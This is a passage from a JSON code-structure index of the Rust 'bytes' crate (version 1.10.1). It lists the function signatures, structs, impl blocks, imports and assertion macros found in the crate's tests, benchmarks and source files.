        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/tests/test_bytes_vec_alloc.rs",
        "function_defs": [
          "fn insert(&self, ptr: *mut u8, size: usize) {",
          "fn remove(&self, ptr: *mut u8) -> usize {",
          "fn test_bytes_advance() {",
          "fn test_bytes_truncate() {",
          "fn test_bytes_truncate_and_advance() {",
          "fn invalid_ptr<T>(addr: usize) -> *mut T {",
          "fn test_bytes_into_vec() {"
        ],
        "struct_defs": [
          "struct Ledger {"
        ],
        "impl_blocks": [
          "impl Ledger {"
        ],
        "uses": [
          "use std::alloc::{GlobalAlloc, Layout, System};",
          "use std::ptr::null_mut;",
          "use std::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};",
          "use bytes::{Buf, Bytes};"
        ],
        "macros": [
          "panic!(\"Ledger ran out of space.\");",
          "panic!(\"Couldn't find a matching entry for {:x?}\", ptr);",
          "panic!(",
          "debug_assert_eq!(ptr as usize, addr);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b2), vec);",
          "assert_eq!(Vec::from(b2), vec[20..]);",
          "assert_eq!(Vec::from(b1), vec[..20]);"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/tests/test_chain.rs",
        "function_defs": [
          "fn collect_two_bufs() {",
          "fn writing_chained() {",
          "fn iterating_two_bufs() {",
          "fn vectored_read() {",
          "fn chain_growing_buffer() {",
          "fn chain_overflow_remaining_mut() {",
          "fn chain_get_bytes() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use bytes::{Buf, BufMut, Bytes};",
          "use std::io::IoSlice;"
        ],
        "macros": [
          "assert_eq!(res, &b\"helloworld\"[..]);",
          "assert_eq!(expect, a[i]);",
          "assert_eq!(expect + 64, b[i]);",
          "assert_eq!(res, &b\"helloworld\"[..]);",
          "assert_eq!(2, buf.chunks_vectored(&mut iovecs));",
          "assert_eq!(iovecs[0][..], b\"hello\"[..]);",
          "assert_eq!(iovecs[1][..], b\"world\"[..]);",
          "assert_eq!(iovecs[2][..], b\"\"[..]);",
          "assert_eq!(iovecs[3][..], b\"\"[..]);",
          "assert_eq!(2, buf.chunks_vectored(&mut iovecs));",
          "assert_eq!(iovecs[0][..], b\"llo\"[..]);",
          "assert_eq!(iovecs[1][..], b\"world\"[..]);",
          "assert_eq!(iovecs[2][..], b\"\"[..]);",
          "assert_eq!(iovecs[3][..], b\"\"[..]);",
          "assert_eq!(1, buf.chunks_vectored(&mut iovecs));",
          "assert_eq!(iovecs[0][..], b\"world\"[..]);",
          "assert_eq!(iovecs[1][..], b\"\"[..]);",
          "assert_eq!(iovecs[2][..], b\"\"[..]);",
          "assert_eq!(iovecs[3][..], b\"\"[..]);",
          "assert_eq!(1, buf.chunks_vectored(&mut iovecs));",
          "assert_eq!(iovecs[0][..], b\"ld\"[..]);",
          "assert_eq!(iovecs[1][..], b\"\"[..]);",
          "assert_eq!(iovecs[2][..], b\"\"[..]);",
          "assert_eq!(iovecs[3][..], b\"\"[..]);",
          "assert_eq!(&buff, b\"hey there1\");",
          "assert_eq!(&vec, b\"wassup23123\");",
          "assert_eq!(chained.remaining_mut(), usize::MAX);",
          "assert_eq!(chained.remaining_mut(), usize::MAX);",
          "assert_eq!(Bytes::copy_from_slice(b\"a\"), a);",
          "assert_eq!(Bytes::copy_from_slice(b\"bc\"), bc);",
          "assert_eq!(Bytes::copy_from_slice(b\"d\"), d);",
          "assert_eq!(ab_ptr, a.as_ptr());",
          "assert_eq!(cd_ptr.wrapping_offset(1), d.as_ptr());"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/tests/test_serde.rs",
        "function_defs": [
          "fn test_ser_de_empty() {",
          "fn test_ser_de() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use serde_test::{assert_tokens, Token};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/tests/test_buf_mut.rs",
        "function_defs": [
          "fn test_vec_as_mut_buf() {",
          "fn test_vec_put_bytes() {",
          "fn test_put_u8() {",
          "fn test_put_u16() {",
          "fn test_put_int() {",
          "fn test_put_int_nbytes_overflow() {",
          "fn test_put_int_le() {",
          "fn test_put_int_le_nbytes_overflow() {",
          "fn test_vec_advance_mut() {",
          "fn test_clone() {",
          "fn do_test_slice_small<T: ?Sized>(make: impl Fn(&mut [u8]) -> &mut T)",
          "fn do_test_slice_large<T: ?Sized>(make: impl Fn(&mut [u8]) -> &mut T)",
          "fn do_test_slice_put_slice_panics<T: ?Sized>(make: impl Fn(&mut [u8]) -> &mut T)",
          "fn do_test_slice_put_bytes_panics<T: ?Sized>(make: impl Fn(&mut [u8]) -> &mut T)",
          "fn test_slice_buf_mut_small() {",
          "fn test_slice_buf_mut_large() {",
          "fn test_slice_buf_mut_put_slice_overflow() {",
          "fn test_slice_buf_mut_put_bytes_overflow() {",
          "fn make_maybe_uninit_slice(slice: &mut [u8]) -> &mut [MaybeUninit<u8>] {",
          "fn test_maybe_uninit_buf_mut_small() {",
          "fn test_maybe_uninit_buf_mut_large() {",
          "fn test_maybe_uninit_buf_mut_put_slice_overflow() {",
          "fn test_maybe_uninit_buf_mut_put_bytes_overflow() {",
          "fn test_deref_bufmut_forwards() {",
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {",
          "fn put_u8(&mut self, _: u8) {",
          "fn write_byte_panics_if_out_of_bounds() {",
          "fn copy_from_slice_panics_if_different_length_1() {",
          "fn copy_from_slice_panics_if_different_length_2() {"
        ],
        "struct_defs": [
          "struct Special;"
        ],
        "impl_blocks": [],
        "uses": [
          "use bytes::buf::UninitSlice;",
          "use bytes::{BufMut, BytesMut};",
          "use core::fmt::Write;",
          "use core::mem::MaybeUninit;",
          "use core::usize;"
        ],
        "macros": [
          "assert_eq!(buf.remaining_mut(), isize::MAX as usize);",
          "assert!(buf.chunk_mut().len() >= 64);",
          "assert_eq!(&buf, b\"zomg\");",
          "assert_eq!(buf.remaining_mut(), isize::MAX as usize - 4);",
          "assert_eq!(buf.capacity(), 64);",
          "assert_eq!(buf.len(), 68);",
          "assert_eq!([17, 19, 19], &buf[..]);",
          "assert_eq!(b\"\\x21\", &buf[..]);",
          "assert_eq!(b\"\\x21\\x54\", &buf[..]);",
          "assert_eq!(b\"\\x54\\x21\", &buf[..]);",
          "assert_eq!(b\"\\x60\\x70\\x80\", &buf[..]);",
          "assert_eq!(b\"\\x80\\x70\\x60\", &buf[..]);",
          "assert!(buf != buf2);",
          "assert_eq!(2, slice.remaining_mut());",
          "assert_eq!(b\"AABBCCXX\", &buf[..]);",
          "assert_eq!(4, slice.remaining_mut());",
          "assert_eq!(b\"abcdCCXX\", &buf[..]);",
          "assert_eq!(4, slice.remaining_mut());",
          "assert_eq!(b\"3210CCXX\", &buf[..]);",
          "assert_eq!(buf_len - fill_len, slice.remaining_mut());",
          "assert_eq!(&FILL[..fill_len], head);",
          "assert!(tail.iter().all(|b| *b == b'X'));",
          "unreachable!(\"remaining_mut\");",
          "unreachable!(\"chunk_mut\");",
          "unreachable!(\"advance\");"
        ],
        "derives": [],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/tests/test_take.rs",
        "function_defs": [
          "fn long_take() {",
          "fn take_copy_to_bytes() {",
          "fn take_copy_to_bytes_panics() {",
          "fn take_chunks_vectored() {",
          "fn chain() -> impl Buf {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use bytes::buf::Buf;",
          "use bytes::Bytes;"
        ],
        "macros": [
          "assert_eq!(11, buf.remaining());",
          "assert_eq!(b\"hello world\", buf.chunk());",
          "assert_eq!(Bytes::copy_from_slice(b\"a\"), a);",
          "assert_eq!(abcd_ptr, a.as_ptr());",
          "assert_eq!(Bytes::copy_from_slice(b\"bcd\"), abcd);",
          "assert_eq!(take.chunks_vectored(&mut dst), 0);",
          "assert_eq!(take.chunks_vectored(&mut dst), 1);",
          "assert_eq!(&*dst[0], &[1]);",
          "assert_eq!(take.chunks_vectored(&mut dst), 1);",
          "assert_eq!(&*dst[0], &[1, 2, 3]);",
          "assert_eq!(take.chunks_vectored(&mut dst), 2);",
          "assert_eq!(&*dst[0], &[1, 2, 3]);",
          "assert_eq!(&*dst[1], &[4]);",
          "assert_eq!(take.chunks_vectored(&mut dst), 2);",
          "assert_eq!(&*dst[0], &[1, 2, 3]);",
          "assert_eq!(&*dst[1], &[4, 5, 6]);",
          "assert_eq!(take.chunks_vectored(&mut dst), 2);",
          "assert_eq!(&*dst[0], &[1, 2, 3]);",
          "assert_eq!(&*dst[1], &[4, 5, 6]);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/benches/buf.rs",
        "function_defs": [
          "fn new(buf: &'static [u8], readlens: &'static [usize], init_pos: usize) -> TestBuf {",
          "fn reset(&mut self) {",
          "fn next_readlen(&mut self) {",
          "fn remaining(&self) -> usize {",
          "fn advance(&mut self, cnt: usize) {",
          "fn chunk(&self) -> &[u8] {",
          "fn new(buf: &'static [u8], readlens: &'static [usize], init_pos: usize) -> TestBufC {",
          "fn reset(&mut self) {",
          "fn remaining(&self) -> usize {",
          "fn advance(&mut self, cnt: usize) {",
          "fn chunk(&self) -> &[u8] {",
          "fn $fname(b: &mut Bencher) {",
          "fn $fname(b: &mut Bencher) {",
          "fn $fname(b: &mut Bencher) {"
        ],
        "struct_defs": [
          "struct TestBuf {",
          "struct TestBufC {"
        ],
        "impl_blocks": [
          "impl TestBuf {",
          "impl Buf for TestBuf {",
          "impl TestBufC {",
          "impl Buf for TestBufC {"
        ],
        "uses": [
          "use bytes::Buf;",
          "use test::Bencher;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;"
        ],
        "macros": [
          "assert!(self.pos <= self.buf.len());",
          "bench!(slice, slice, $method $(,$arg)*);",
          "bench!(tbuf_1,        testbuf TestBuf  &[],  $method $(,$arg)*);",
          "bench!(tbuf_1_costly, testbuf TestBufC &[],  $method $(,$arg)*);",
          "bench!(tbuf_2,        testbuf TestBuf  &[1], $method $(,$arg)*);",
          "bench!(tbuf_2_costly, testbuf TestBufC &[1], $method $(,$arg)*);",
          "// bench!(tbuf_onebyone,        testbuf TestBuf  &[1,1,1,1,1,1,1,1], $method $(,",
          "// bench!(tbuf_onebyone_costly, testbuf TestBufC &[1,1,1,1,1,1,1,1], $method $(,",
          "bench_group!(get_u8);",
          "bench_group!(get_u16);",
          "bench_group!(get_u32);",
          "bench_group!(get_u64);",
          "bench_group!(get_f32);",
          "bench_group!(get_f64);",
          "bench_group!(get_uint, 3);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/benches/bytes_mut.rs",
        "function_defs": [
          "fn alloc_small(b: &mut Bencher) {",
          "fn alloc_mid(b: &mut Bencher) {",
          "fn alloc_big(b: &mut Bencher) {",
          "fn deref_unique(b: &mut Bencher) {",
          "fn deref_unique_unroll(b: &mut Bencher) {",
          "fn deref_shared(b: &mut Bencher) {",
          "fn deref_two(b: &mut Bencher) {",
          "fn clone_frozen(b: &mut Bencher) {",
          "fn alloc_write_split_to_mid(b: &mut Bencher) {",
          "fn drain_write_drain(b: &mut Bencher) {",
          "fn fmt_write(b: &mut Bencher) {",
          "fn bytes_mut_extend(b: &mut Bencher) {",
          "fn put_slice_bytes_mut(b: &mut Bencher) {",
          "fn put_u8_bytes_mut(b: &mut Bencher) {",
          "fn put_slice_vec(b: &mut Bencher) {",
          "fn put_u8_vec(b: &mut Bencher) {",
          "fn put_slice_vec_extend(b: &mut Bencher) {",
          "fn put_u8_vec_push(b: &mut Bencher) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use bytes::{BufMut, BytesMut};",
          "use test::Bencher;",
          "use std::fmt::Write;"
        ],
        "macros": [
          "let _ = write!(buf, \"{}\", s);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/benches/bytes.rs",
        "function_defs": [
          "fn deref_unique(b: &mut Bencher) {",
          "fn deref_shared(b: &mut Bencher) {",
          "fn deref_static(b: &mut Bencher) {",
          "fn clone_static(b: &mut Bencher) {",
          "fn clone_shared(b: &mut Bencher) {",
          "fn clone_arc_vec(b: &mut Bencher) {",
          "fn from_long_slice(b: &mut Bencher) {",
          "fn slice_empty(b: &mut Bencher) {",
          "fn slice_short_from_arc(b: &mut Bencher) {",
          "fn split_off_and_drop(b: &mut Bencher) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use bytes::Bytes;",
          "use test::Bencher;",
          "use std::sync::Arc;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/serde.rs",
        "function_defs": [
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn visit_seq<V>(self, mut seq: V) -> Result<Self::Value, V::Error>",
          "fn visit_bytes<E>(self, v: &[u8]) -> Result<Self::Value, E>",
          "fn visit_byte_buf<E>(self, v: Vec<u8>) -> Result<Self::Value, E>",
          "fn visit_str<E>(self, v: &str) -> Result<Self::Value, E>",
          "fn visit_string<E>(self, v: String) -> Result<Self::Value, E>",
          "fn deserialize<D>(deserializer: D) -> Result<$ty, D::Error>"
        ],
        "struct_defs": [
          "struct $visitor_ty;"
        ],
        "impl_blocks": [
          "impl Serialize for $ty {"
        ],
        "uses": [
          "use super::{Bytes, BytesMut};",
          "use alloc::string::String;",
          "use alloc::vec::Vec;",
          "use core::{cmp, fmt};",
          "use serde::{de, Deserialize, Deserializer, Serialize, Serializer};"
        ],
        "macros": [
          "serde_impl!(Bytes, BytesVisitor, copy_from_slice, from);",
          "serde_impl!(BytesMut, BytesMutVisitor, from, from_vec);"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/bytes_mut.rs",
        "function_defs": [
          "fn reserve_inner(&mut self, additional: usize, allocate: bool) -> bool {",
          "fn as_slice(&self) -> &[u8] {",
          "fn as_slice_mut(&mut self) -> &mut [u8] {",
          "fn try_unsplit(&mut self, other: BytesMut) -> Result<(), BytesMut> {",
          "fn kind(&self) -> usize {",
          "fn drop(&mut self) {",
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn advance(&mut self, cnt: usize) {",
          "fn copy_to_bytes(&mut self, len: usize) -> Bytes {",
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {",
          "fn put<T: Buf>(&mut self, mut src: T)",
          "fn put_slice(&mut self, src: &[u8]) {",
          "fn put_bytes(&mut self, val: u8, cnt: usize) {",
          "fn as_ref(&self) -> &[u8] {",
          "fn deref(&self) -> &[u8] {",
          "fn as_mut(&mut self) -> &mut [u8] {",
          "fn deref_mut(&mut self) -> &mut [u8] {",
          "fn from(src: &'a [u8]) -> BytesMut {",
          "fn from(src: &'a str) -> BytesMut {",
          "fn from(src: BytesMut) -> Bytes {",
          "fn eq(&self, other: &BytesMut) -> bool {",
          "fn partial_cmp(&self, other: &BytesMut) -> Option<cmp::Ordering> {",
          "fn cmp(&self, other: &BytesMut) -> cmp::Ordering {",
          "fn default() -> BytesMut {",
          "fn hash<H>(&self, state: &mut H)",
          "fn borrow(&self) -> &[u8] {",
          "fn borrow_mut(&mut self) -> &mut [u8] {",
          "fn write_str(&mut self, s: &str) -> fmt::Result {",
          "fn write_fmt(&mut self, args: fmt::Arguments<'_>) -> fmt::Result {",
          "fn clone(&self) -> BytesMut {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn extend<T>(&mut self, iter: T)",
          "fn extend<T>(&mut self, iter: T)",
          "fn extend<T>(&mut self, iter: T)",
          "fn from_iter<T: IntoIterator<Item = u8>>(into_iter: T) -> Self {",
          "fn from_iter<T: IntoIterator<Item = &'a u8>>(into_iter: T) -> Self {",
          "fn is_unique(&self) -> bool {",
          "fn original_capacity_to_repr(cap: usize) -> usize {",
          "fn original_capacity_from_repr(repr: usize) -> usize {",
          "fn test_original_capacity_to_repr() {",
          "fn test_original_capacity_from_repr() {",
          "fn eq(&self, other: &[u8]) -> bool {",
          "fn partial_cmp(&self, other: &[u8]) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &BytesMut) -> bool {",
          "fn partial_cmp(&self, other: &BytesMut) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &str) -> bool {",
          "fn partial_cmp(&self, other: &str) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &BytesMut) -> bool {",
          "fn partial_cmp(&self, other: &BytesMut) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Vec<u8>) -> bool {",
          "fn partial_cmp(&self, other: &Vec<u8>) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &BytesMut) -> bool {",
          "fn partial_cmp(&self, other: &BytesMut) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &String) -> bool {",
          "fn partial_cmp(&self, other: &String) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &BytesMut) -> bool {",
          "fn partial_cmp(&self, other: &BytesMut) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &&'a T) -> bool {",
          "fn partial_cmp(&self, other: &&'a T) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &BytesMut) -> bool {",
          "fn partial_cmp(&self, other: &BytesMut) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &BytesMut) -> bool {",
          "fn partial_cmp(&self, other: &BytesMut) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &BytesMut) -> bool {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn from(bytes: BytesMut) -> Self {",
          "fn vptr(ptr: *mut u8) -> NonNull<u8> {",
          "fn invalid_ptr<T>(addr: usize) -> *mut T {",
          "fn _split_to_must_use() {}",
          "fn _split_off_must_use() {}",
          "fn _split_must_use() {}",
          "fn bytes_mut_cloning_frozen() {"
        ],
        "struct_defs": [
          "struct Shared {"
        ],
        "impl_blocks": [
          "impl BytesMut {",
          "impl Drop for BytesMut {",
          "impl Buf for BytesMut {",
          "impl AsRef<[u8]> for BytesMut {",
          "impl Deref for BytesMut {",
          "impl AsMut<[u8]> for BytesMut {",
          "impl DerefMut for BytesMut {",
          "impl From<BytesMut> for Bytes {",
          "impl PartialEq for BytesMut {",
          "impl PartialOrd for BytesMut {",
          "impl Ord for BytesMut {",
          "impl Eq for BytesMut {}",
          "impl Default for BytesMut {",
          "impl hash::Hash for BytesMut {",
          "impl Borrow<[u8]> for BytesMut {",
          "impl BorrowMut<[u8]> for BytesMut {",
          "impl fmt::Write for BytesMut {",
          "impl Clone for BytesMut {",
          "impl IntoIterator for BytesMut {",
          "impl Extend<u8> for BytesMut {",
          "impl Extend<Bytes> for BytesMut {",
          "impl FromIterator<u8> for BytesMut {",
          "impl Shared {",
          "impl PartialEq<[u8]> for BytesMut {",
          "impl PartialOrd<[u8]> for BytesMut {",
          "impl PartialEq<BytesMut> for [u8] {",
          "impl PartialOrd<BytesMut> for [u8] {",
          "impl PartialEq<str> for BytesMut {",
          "impl PartialOrd<str> for BytesMut {",
          "impl PartialEq<BytesMut> for str {",
          "impl PartialOrd<BytesMut> for str {",
          "impl PartialEq<Vec<u8>> for BytesMut {",
          "impl PartialOrd<Vec<u8>> for BytesMut {",
          "impl PartialEq<BytesMut> for Vec<u8> {",
          "impl PartialOrd<BytesMut> for Vec<u8> {",
          "impl PartialEq<String> for BytesMut {",
          "impl PartialOrd<String> for BytesMut {",
          "impl PartialEq<BytesMut> for String {",
          "impl PartialOrd<BytesMut> for String {",
          "impl PartialEq<BytesMut> for &[u8] {",
          "impl PartialOrd<BytesMut> for &[u8] {",
          "impl PartialEq<BytesMut> for &str {",
          "impl PartialOrd<BytesMut> for &str {",
          "impl PartialEq<BytesMut> for Bytes {",
          "impl PartialEq<Bytes> for BytesMut {",
          "impl From<BytesMut> for Vec<u8> {"
        ],
        "uses": [
          "use core::iter::FromIterator;",
          "use core::mem::{self, ManuallyDrop, MaybeUninit};",
          "use core::ops::{Deref, DerefMut};",
          "use core::ptr::{self, NonNull};",
          "use core::{cmp, fmt, hash, isize, slice, usize};",
          "use alloc::{",
          "use crate::buf::{IntoIter, UninitSlice};",
          "use crate::bytes::Vtable;",
          "use crate::loom::sync::atomic::AtomicMut;",
          "use crate::loom::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};",
          "use crate::{offset_from, Buf, BufMut, Bytes, TryGetError};",
          "use super::*;",
          "use loom::sync::Arc;",
          "use loom::thread;",
          "use super::BytesMut;",
          "use crate::Bytes;"
        ],
        "macros": [
          "/// assert_eq!(&buf[..], b\"hello\");",
          "/// assert_eq!(&a[..], b\"hello\");",
          "/// assert_eq!(&b[..], b\"hello\");",
          "/// assert_eq!(bytes.len(), 0);",
          "/// assert_eq!(&bytes[..], b\"hello world\");",
          "/// assert_eq!(0, bytes.len());",
          "/// assert_eq!(&b\"xy\"[..], &bytes[..]);",
          "/// assert_eq!(b.len(), 5);",
          "/// assert!(b.is_empty());",
          "/// assert_eq!(b.capacity(), 64);",
          "///     assert_eq!(&b1[..], b\"hello world\");",
          "/// assert_eq!(&b2[..], b\"hello world\");",
          "debug_assert_eq!(bytes.kind(), KIND_ARC);",
          "/// assert!(zeros.capacity() >= 42);",
          "/// assert_eq!(zeros.len(), 42);",
          "/// zeros.into_iter().for_each(|x| assert_eq!(x, 0));",
          "/// assert_eq!(&a[..], b\"jello\");",
          "/// assert_eq!(&b[..], b\"!world\");",
          "assert!(",
          "/// assert!(buf.is_empty());",
          "/// assert_eq!(1013, buf.capacity());",
          "/// assert_eq!(other, b\"hello world\"[..]);",
          "/// assert_eq!(&a[..], b\"!world\");",
          "/// assert_eq!(&b[..], b\"jello\");",
          "assert!(",
          "/// assert_eq!(buf, b\"hello\"[..]);",
          "/// assert!(buf.is_empty());",
          "/// assert_eq!(&buf[..], &[0x1, 0x1, 0x1]);",
          "/// assert_eq!(&buf[..], &[0x1, 0x1]);",
          "/// assert_eq!(&buf[..], &[0x1, 0x1, 0x3, 0x3]);",
          "/// assert_eq!(&b[..], b\"hello\");",
          "/// assert_eq!(&b[..], b\"hello world\");",
          "debug_assert!(len <= self.cap, \"set_len out of bounds\");",
          "/// assert!(buf.capacity() >= 69);",
          "/// assert!(buf.is_empty());",
          "/// assert_eq!(buf.capacity(), 64);",
          "/// assert_eq!(buf.capacity(), 128);",
          "/// assert_eq!(buf.as_ptr(), ptr);",
          "debug_assert_eq!(self.len, v.len() - off);",
          "debug_assert_eq!(kind, KIND_ARC);",
          "None => panic!(\"overflow\"),",
          "debug_assert!(off + len <= v.capacity());",
          "debug_assert_eq!(self.len, v.len());",
          "/// assert_eq!(true, buf.try_reclaim(64));",
          "/// assert_eq!(64, buf.capacity());",
          "/// assert_eq!(60, buf.capacity());",
          "/// assert_eq!(4, split.capacity());",
          "/// assert_eq!(false, split.try_reclaim(64));",
          "/// assert_eq!(false, buf.try_reclaim(64));",
          "/// assert_eq!(false, split.try_reclaim(4));",
          "/// assert_eq!(true, buf.try_reclaim(60));",
          "/// assert_eq!(false, split.try_reclaim(64));",
          "/// assert_eq!(4, split.capacity());",
          "/// assert_eq!(true, split.try_reclaim(64));",
          "/// assert_eq!(64, split.capacity());",
          "/// assert_eq!(b\"aaabbbcccddd\", &buf[..]);",
          "debug_assert!(dst.len() >= cnt);",
          "/// assert_eq!(b\"aaabbb\", &buf[..]);",
          "/// assert_eq!(b\"cccddd\", &split[..]);",
          "/// assert_eq!(b\"aaabbbcccddd\", &buf[..]);",
          "debug_assert!(count <= self.cap, \"internal: set_start out of bounds\");",
          "debug_assert_eq!(self.kind(), KIND_VEC);",
          "debug_assert!(ref_cnt == 1 || ref_cnt == 2);",
          "debug_assert_eq!(shared as usize & KIND_MASK, KIND_ARC);",
          "debug_assert_eq!(self.kind(), KIND_VEC);",
          "debug_assert_eq!(self.kind(), KIND_VEC);",
          "debug_assert!(pos <= MAX_VEC_POS);",
          "/// assert_eq!(&buf[..], &[0, 1, 2]);",
          "assert!(",
          "debug_assert!(dst.len() >= cnt);",
          "assert_eq!(original_capacity_to_repr(0), 0);",
          "assert_eq!(original_capacity_to_repr(cap), expected);",
          "assert_eq!(original_capacity_to_repr(cap + 1), expected);",
          "assert_eq!(original_capacity_to_repr(cap - 24), expected - 1);",
          "assert_eq!(original_capacity_to_repr(cap + 76), expected);",
          "assert_eq!(original_capacity_to_repr(cap - 1), expected - 1);",
          "assert_eq!(original_capacity_to_repr(cap - 48), expected - 1);",
          "assert_eq!(0, original_capacity_from_repr(0));",
          "assert_eq!(min_cap, original_capacity_from_repr(1));",
          "assert_eq!(min_cap * 2, original_capacity_from_repr(2));",
          "assert_eq!(min_cap * 4, original_capacity_from_repr(3));",
          "assert_eq!(min_cap * 8, original_capacity_from_repr(4));",
          "assert_eq!(min_cap * 16, original_capacity_from_repr(5));",
          "assert_eq!(min_cap * 32, original_capacity_from_repr(6));",
          "assert_eq!(min_cap * 64, original_capacity_from_repr(7));",
          "if cfg!(debug_assertions) {",
          "debug_assert_eq!(ptr as usize, addr);",
          "assert_eq!(b.as_ptr() as usize, addr);",
          "assert_eq!(b.as_ptr() as usize, addr);"
        ],
        "derives": [],
        "error_handling": 9
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/lib.rs",
        "function_defs": [
          "fn abort() -> ! {",
          "fn drop(&mut self) {",
          "fn saturating_sub_usize_u64(a: usize, b: u64) -> usize {",
          "fn min_u64_usize(a: u64, b: usize) -> usize {",
          "fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> Result<(), core::fmt::Error> {",
          "fn from(error: TryGetError) -> Self {",
          "fn panic_advance(error_info: &TryGetError) -> ! {",
          "fn panic_does_not_fit(size: usize, nbytes: usize) -> ! {",
          "fn offset_from(dst: *const u8, original: *const u8) -> usize {"
        ],
        "struct_defs": [
          "struct Abort;"
        ],
        "impl_blocks": [
          "impl Drop for Abort {",
          "impl core::fmt::Display for TryGetError {",
          "impl std::error::Error for TryGetError {}",
          "impl From<TryGetError> for std::io::Error {"
        ],
        "uses": [
          "use core::convert::TryFrom;",
          "use core::convert::TryFrom;"
        ],
        "macros": [
          "//! assert_eq!(a, b\"hello world\\x04\\xD2\"[..]);",
          "//! assert_eq!(b, b\"goodbye world\"[..]);",
          "//! assert_eq!(buf.capacity(), 998);",
          "panic!();",
          "panic!(\"abort\");",
          "write!(",
          "panic!(",
          "panic!("
        ],
        "derives": [
          "#[derive(Debug, PartialEq, Eq)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/bytes.rs",
        "function_defs": [
          "fn new_empty_with_ptr(ptr: *const u8) -> Self {",
          "fn as_slice(&self) -> &[u8] {",
          "fn drop(&mut self) {",
          "fn clone(&self) -> Bytes {",
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn advance(&mut self, cnt: usize) {",
          "fn copy_to_bytes(&mut self, len: usize) -> Self {",
          "fn deref(&self) -> &[u8] {",
          "fn as_ref(&self) -> &[u8] {",
          "fn hash<H>(&self, state: &mut H)",
          "fn borrow(&self) -> &[u8] {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn from_iter<T: IntoIterator<Item = u8>>(into_iter: T) -> Self {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn partial_cmp(&self, other: &Bytes) -> Option<cmp::Ordering> {",
          "fn cmp(&self, other: &Bytes) -> cmp::Ordering {",
          "fn eq(&self, other: &[u8]) -> bool {",
          "fn partial_cmp(&self, other: &[u8]) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn partial_cmp(&self, other: &Bytes) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &str) -> bool {",
          "fn partial_cmp(&self, other: &str) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn partial_cmp(&self, other: &Bytes) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Vec<u8>) -> bool {",
          "fn partial_cmp(&self, other: &Vec<u8>) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn partial_cmp(&self, other: &Bytes) -> Option<cmp::Ordering> {",
